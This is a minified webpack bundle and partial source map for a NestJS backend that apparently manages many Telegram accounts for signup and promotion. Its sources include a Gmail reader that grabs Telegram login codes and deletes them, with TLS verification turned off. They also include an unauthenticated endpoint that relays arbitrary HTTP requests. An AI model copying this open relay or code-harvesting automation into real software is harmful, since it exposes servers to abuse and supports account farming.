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","sources":[".././src/IMap/IMap.ts",".././src/app.controller.ts",".././src/app.module.ts",".././src/app.service.ts",".././src/cloudinary.ts",".././src/components/ConfigurationInit/configuration.schema.ts",".././src/components/ConfigurationInit/init.controller.ts",".././src/components/ConfigurationInit/init.module.ts",".././src/components/ConfigurationInit/init.service.ts",".././src/components/Telegram/Telegram.controller.ts",".././src/components/Telegram/Telegram.module.ts",".././src/components/Telegram/Telegram.service.ts",".././src/components/Telegram/TelegramManager.ts",".././src/components/Telegram/config/telegram-validation.config.ts",".././src/components/Telegram/dto/batch-operations.dto.ts",".././src/components/Telegram/dto/common-responses.dto.ts",".././src/components/Telegram/dto/contact-management.dto.ts",".././src/components/Telegram/dto/create-chat-folder.dto.ts",".././src/components/Telegram/dto/group-operations.dto.ts",".././src/components/Telegram/dto/index.ts",".././src/components/Telegram/dto/media-operations.dto.ts",".././src/components/Telegram/dto/message-search.dto.ts",".././src/components/Telegram/dto/metadata-operations.dto.ts",".././src/components/Telegram/dto/profile-settings.dto.ts",".././src/components/Telegram/dto/schedule-operations.dto.ts",".././src/components/Telegram/types/telegram-error.ts",".././src/components/Telegram/utils/client-metadata.ts",".././src/components/Telegram/utils/connection-manager.ts",".././src/components/Telegram/utils/rate-limiter.ts",".././src/components/Telegram/utils/telegram-logger.ts",".././src/components/TgSignup/TgSignup.module.ts",".././src/components/TgSignup/TgSignup.service.ts",".././src/components/TgSignup/dto/tg-signup.dto.ts",".././src/components/TgSignup/tgSignup.controller.ts",".././src/components/active-channels/active-channels.controller.ts",".././src/components/active-channels/active-channels.module.ts",".././src/components/active-channels/active-channels.service.ts",".././src/components/active-channels/dto/add-reaction.dto.ts",".././src/components/active-channels/dto/create-active-channel.dto.ts",".././src/components/active-channels/dto/update-active-channel.dto.ts",".././src/components/active-channels/schemas/active-channel.schema.ts",".././src/components/archived-clients/archived-client.controller.ts",".././src/components/archived-clients/archived-client.module.ts",".././src/components/archived-clients/archived-client.service.ts",".././src/components/buffer-clients/buffer-client.controller.ts",".././src/components/buffer-clients/buffer-client.module.ts",".././src/components/buffer-clients/buffer-client.service.ts",".././src/components/buffer-clients/dto/create-buffer-client.dto.ts",".././src/components/buffer-clients/dto/search-buffer- client.dto.ts",".././src/components/buffer-clients/dto/update-buffer-client.dto.ts",".././src/components/buffer-clients/schemas/buffer-client.schema.ts",".././src/components/builds/build.controller.ts",".././src/components/builds/build.module.ts",".././src/components/builds/build.service.ts",".././src/components/builds/builds.schema.ts",".././src/components/channels/channels.controller.ts",".././src/components/channels/channels.module.ts",".././src/components/channels/channels.service.ts",".././src/components/channels/dto/create-channel.dto.ts",".././src/components/channels/dto/search-channel.dto.ts",".././src/components/channels/dto/update-channel.dto.ts",".././src/components/channels/schemas/channel.schema.ts",".././src/components/clients/client.controller.ts",".././src/components/clients/client.module.ts",".././src/components/clients/client.service.ts",".././src/components/clients/dto/create-client.dto.ts",".././src/components/clients/dto/search-client.dto.ts",".././src/components/clients/dto/update-client.dto.ts",".././src/components/clients/schemas/client.schema.ts",".././src/components/n-point/npoint.controller.ts",".././src/components/n-point/npoint.module.ts",".././src/components/n-point/npoint.service.ts",".././src/components/promote-clients/dto/create-promote-client.dto.ts",".././src/components/promote-clients/dto/search-promote-client.dto.ts",".././src/components/promote-clients/dto/update-promote-client.dto.ts",".././src/components/promote-clients/promote-client.controller.ts",".././src/components/promote-clients/promote-client.module.ts",".././src/components/promote-clients/promote-client.service.ts",".././src/components/promote-clients/schemas/promote-client.schema.ts",".././src/components/promote-msgs/promote-msgs.controller.ts",".././src/components/promote-msgs/promote-msgs.module.ts",".././src/components/promote-msgs/promote-msgs.schema.ts",".././src/components/promote-msgs/promote-msgs.service.ts",".././src/components/promote-stats/dto/create-promote-stat.dto.ts",".././src/components/promote-stats/dto/update-promote-stat.dto.ts",".././src/components/promote-stats/promote-stat.controller.ts",".././src/components/promote-stats/promote-stat.module.ts",".././src/components/promote-stats/promote-stat.service.ts",".././src/components/promote-stats/schemas/promote-stat.schema.ts",".././src/components/shared/dto/execute-request.dto.ts",".././src/components/stats/create-stat.dto.ts",".././src/components/stats/stat.controller.ts",".././src/components/stats/stat.module.ts",".././src/components/stats/stat.schema.ts",".././src/components/stats/stat.service.ts",".././src/components/stats/update-stat.dto.ts",".././src/components/stats2/create-stat2.dto.ts",".././src/components/stats2/stat2.controller.ts",".././src/components/stats2/stat2.module.ts",".././src/components/stats2/stat2.schema.ts",".././src/components/stats2/stat2.service.ts",".././src/components/stats2/update-stat2.dto.ts",".././src/components/transactions/dto/create-transaction.dto.ts",".././src/components/transactions/dto/update-transaction.dto.ts",".././src/components/transactions/schemas/transaction.schema.ts",".././src/components/transactions/transaction.controller.ts",".././src/components/transactions/transaction.module.ts",".././src/components/transactions/transaction.service.ts",".././src/components/upi-ids/upi-ids.controller.ts",".././src/components/upi-ids/upi-ids.module.ts",".././src/components/upi-ids/upi-ids.schema.ts",".././src/components/upi-ids/upi-ids.service.ts",".././src/components/user-data/dto/create-user-data.dto.ts",".././src/components/user-data/dto/search-user-data.dto.ts",".././src/components/user-data/dto/update-user-data.dto.ts",".././src/components/user-data/schemas/user-data.schema.ts",".././src/components/user-data/user-data.controller.ts",".././src/components/user-data/user-data.module.ts",".././src/components/user-data/user-data.service.ts",".././src/components/users/dto/create-user.dto.ts",".././src/components/users/dto/search-user.dto.ts",".././src/components/users/dto/update-user.dto.ts",".././src/components/users/schemas/user.schema.ts",".././src/components/users/users.controller.ts",".././src/components/users/users.module.ts",".././src/components/users/users.service.ts",".././src/interfaces/telegram.ts",".././src/main.ts",".././src/middlewares/logger.middleware.ts",".././src/utils.ts",".././src/utils/fetchWithTimeout.ts",".././src/utils/logbots.ts",".././src/utils/parseError.ts","../external commonjs \"@nestjs/common\"","../external commonjs \"@nestjs/config\"","../external commonjs \"@nestjs/core\"","../external commonjs \"@nestjs/mapped-types\"","../external commonjs \"@nestjs/mongoose\"","../external commonjs \"@nestjs/swagger\"","../external commonjs \"adm-zip\"","../external commonjs \"axios\"","../external commonjs \"big-integer\"","../external commonjs \"class-transformer\"","../external commonjs \"class-validator\"","../external commonjs \"cloudinary\"","../external commonjs \"https\"","../external commonjs \"imap\"","../external commonjs \"mongoose\"","../external commonjs \"telegram\"","../external commonjs \"telegram/Helpers\"","../external commonjs \"telegram/Password\"","../external commonjs \"telegram/client/uploads\"","../external commonjs \"telegram/events\"","../external commonjs \"telegram/extensions/Logger\"","../external commonjs \"telegram/sessions\"","../external commonjs \"telegram/tl\"","../external node-commonjs \"crypto\"","../external node-commonjs \"fs\"","../external node-commonjs \"http\"","../external node-commonjs \"path\"","../webpack/bootstrap","../webpack/startup"],"sourcesContent":["import Imap from 'imap';\nimport { fetchNumbersFromString, sleep } from '../utils';\nimport { parseError } from '../utils/parseError';\n\nexport class MailReader {\n    private static instance: MailReader;\n    private imap: Imap;\n    private isReady: boolean = false;\n    private result: string = '';\n\n    private constructor() {\n        this.imap = new Imap({\n            user: process.env.GMAIL_ADD || '',\n            password: process.env.GMAIL_PASS || '',\n            host: 'imap.gmail.com',\n            port: 993,\n            tls: true,\n            tlsOptions: {\n                rejectUnauthorized: false,\n            },\n        });\n\n        this.imap.on('ready', () => {\n            console.log('Mail is Ready');\n            this.isReady = true;\n        });\n\n        this.imap.on('error', (err: Error) => {\n            console.error('SomeError:', err);\n            this.isReady = false;\n        });\n\n        this.imap.on('end', () => {\n            console.log('Connection ended');\n            this.isReady = false;\n        });\n    }\n\n    public static getInstance(): MailReader {\n        if (!MailReader.instance) {\n            MailReader.instance = new MailReader();\n        }\n        return MailReader.instance;\n    }\n\n    public async connectToMail(): Promise<void> {\n        console.log('Connecting to mail server');\n        try {\n            this.imap.connect();\n            this.isReady = true;\n            console.log('Connected to mail server');\n        } catch (err) {\n            console.error('Error connecting to mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async disconnectFromMail(): Promise<void> {\n        console.log('Disconnecting from mail server');\n        try {\n            this.imap.end();\n            this.isReady = false;\n            console.log('Disconnected from mail server');\n        } catch (err) {\n            console.error('Error disconnecting from mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async isMailReady(): Promise<boolean> {\n        return this.isReady;\n    }\n\n    public async getCode(): Promise<string> {\n        console.log(\"MailReady : \", this.isReady)\n        if (!this.isReady) {\n            console.log(\"Re-Connecting mail server\");\n            await this.connectToMail();\n            await sleep(10000);\n        }\n\n        try {\n            await this.openInbox();\n\n            const searchCriteria = [['FROM', 'noreply@telegram.org']];\n            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };\n            console.log('Inbox Opened');\n\n            const results = await new Promise<any[]>((resolve, reject) => {\n                this.imap.search(searchCriteria, (err, results) => {\n                    if (err) {\n                        console.error('Search error:', parseError(err));\n                        reject(err);\n                    } else {\n                        resolve(results);\n                    }\n                });\n            });\n\n            if (results.length > 0) {\n                console.log('Emails found:', results.length);\n                const length = results.length;\n                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);\n\n                await new Promise<void>((resolve, reject) => {\n                    fetch.on('message', (msg, seqno) => {\n                        const emailData: string[] = [];\n\n                        msg.on('body', (stream, info) => {\n                            let buffer = '';\n                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));\n                            stream.on('end', () => {\n                                if (info.which === 'TEXT') {\n                                    emailData.push(buffer);\n                                }\n                                this.imap.seq.addFlags([seqno], '\\\\Deleted', (err) => {\n                                    if (err) reject(err);\n                                    this.imap.expunge((err) => {\n                                        if (err) reject(err);\n                                        console.log('Deleted message');\n                                    });\n                                });\n                            });\n                        });\n\n                        msg.once('end', () => {\n                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);\n                            console.log('EmailDataLength:', emailData.length);\n                            console.log('Mail:', emailData[emailData.length - 1].split('.'));\n                            this.result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);\n                            resolve();\n                        });\n                    });\n\n                    fetch.once('end', () => {\n                        console.log('Fetched mails');\n                        resolve();\n                    });\n                });\n            } else {\n                console.log('No new emails found');\n            }\n\n            console.log('Returning result:', this.result);\n            return this.result;\n        } catch (error) {\n            console.error('Error:', error);\n            this.isReady = false;\n            throw error;\n        }\n    }\n\n    private async openInbox(): Promise<void> {\n        await new Promise<void>((resolve, reject) => {\n            this.imap.openBox('INBOX', false, (err) => {\n                if (err) {\n                    console.error('Open Inbox error:', parseError(err));\n                    reject(err);\n                } else {\n                    console.log('Inbox opened');\n                    resolve();\n                }\n            });\n        });\n    }\n}","import { Controller, Get, Post, Body, ValidationPipe, Logger, Res } from '@nestjs/common';\r\nimport { AppService } from './app.service';\r\nimport { ApiOperation } from '@nestjs/swagger';\r\nimport axios from 'axios';\r\nimport { ExecuteRequestDto } from './components/shared/dto/execute-request.dto';\r\nimport { randomUUID } from 'crypto';\r\nimport { Response } from 'express';\r\n\r\n@Controller()\r\nexport class AppController {\r\n    private logger = new Logger('AppController');\r\n\r\n    constructor(private readonly appService: AppService) {}\r\n\r\n    @Get()\r\n    getHello(): string {\r\n        return this.appService.getHello();\r\n    }\r\n\r\n    @Post('execute-request')\r\n    @ApiOperation({ summary: 'Execute an HTTP request with given details' })\r\n    async executeRequest(\r\n        @Body(new ValidationPipe({ transform: true })) requestDetails: ExecuteRequestDto,\r\n        @Res() res: Response\r\n    ) {\r\n        const requestId = randomUUID();\r\n        const startTime = Date.now();\r\n\r\n        try {\r\n            const {\r\n                url,\r\n                method = 'GET',\r\n                headers = {},\r\n                data,\r\n                params,\r\n                responseType = 'json',\r\n                timeout = 30000,\r\n                followRedirects = true,\r\n                maxRedirects = 5\r\n            } = requestDetails;\r\n\r\n            // Log request details\r\n            this.logger.log({\r\n                message: 'Executing HTTP request',\r\n                requestId,\r\n                details: {\r\n                    url,\r\n                    method,\r\n                    headers: this.sanitizeHeaders(headers),\r\n                    params,\r\n                    responseType,\r\n                    timeout,\r\n                    dataSize: data ? JSON.stringify(data).length : 0\r\n                }\r\n            });\r\n\r\n            const response = await axios({\r\n                url,\r\n                method,\r\n                headers,\r\n                data,\r\n                params,\r\n                responseType,\r\n                timeout,\r\n                maxRedirects: followRedirects ? maxRedirects : 0,\r\n                maxContentLength: Infinity,\r\n                maxBodyLength: Infinity,\r\n                validateStatus: () => true,\r\n                decompress: true,\r\n            });\r\n\r\n            // Set response status\r\n            res.status(response.status);\r\n\r\n            // Copy all headers from the upstream response\r\n            Object.entries(response.headers).forEach(([key, value]) => {\r\n                // Skip transfer-encoding as it might conflict with our response\r\n                if (key.toLowerCase() === 'transfer-encoding') return;\r\n\r\n                if (Array.isArray(value)) {\r\n                    res.setHeader(key, value);\r\n                } else {\r\n                    res.setHeader(key, value as string);\r\n                }\r\n            });\r\n\r\n            // Log response details\r\n            this.logger.log({\r\n                message: 'Request completed',\r\n                requestId,\r\n                metrics: {\r\n                    executionTime: Date.now() - startTime,\r\n                    status: response.status,\r\n                    contentType: response.headers['content-type']\r\n                }\r\n            });\r\n\r\n            // For binary responses, send the raw buffer\r\n            if (responseType === 'arraybuffer' ||\r\n                response.headers['content-type']?.includes('application/octet-stream') ||\r\n                response.headers['content-type']?.includes('image/') ||\r\n                response.headers['content-type']?.includes('audio/') ||\r\n                response.headers['content-type']?.includes('video/') ||\r\n                response.headers['content-type']?.includes('application/pdf')) {\r\n\r\n                // Ensure content-type is preserved\r\n                if (!res.getHeader('content-type') && response.headers['content-type']) {\r\n                    res.setHeader('content-type', response.headers['content-type']);\r\n                }\r\n\r\n                // Send raw buffer for binary data\r\n                return res.send(Buffer.from(response.data));\r\n            }\r\n\r\n            // For other types, send as is\r\n            return res.send(response.data);\r\n\r\n        } catch (error) {\r\n            this.logger.error({\r\n                message: 'Request failed',\r\n                requestId,\r\n                error: {\r\n                    message: error.message,\r\n                    code: error.code,\r\n                    stack: error.stack\r\n                }\r\n            });\r\n\r\n            // Handle error response\r\n            if (error.response) {\r\n                // Copy error response headers\r\n                Object.entries(error.response.headers).forEach(([key, value]) => {\r\n                    if (key.toLowerCase() === 'transfer-encoding') return;\r\n                    if (Array.isArray(value)) {\r\n                        res.setHeader(key, value);\r\n                    } else {\r\n                        res.setHeader(key, value as string);\r\n                    }\r\n                });\r\n\r\n                return 